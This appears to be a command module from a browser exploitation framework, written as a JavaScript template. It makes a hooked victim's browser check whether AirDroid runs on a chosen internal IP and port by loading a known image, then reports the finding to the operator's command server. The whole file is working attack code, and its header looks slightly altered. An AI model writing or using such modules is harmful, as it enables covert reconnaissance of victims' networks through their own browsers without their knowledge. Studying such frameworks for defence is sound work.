//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var result = "Not Installed";
	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://<%= @ipHost %>:<%= @port %>/theme/stock/images/ip_auth_refused.png";
	img.onload = function() {
		if (this.width == 146 && this.height == 176) result = "Installed";
		server.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&airdroid='+result, server.are.status_success());
		dom.removeChild(this);
	}
	img.onerror = function() {
		server.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&airdroid='+result, server.are.status_error());
		dom.removeChild(this);
	}
	dom.appendChild(img);

});

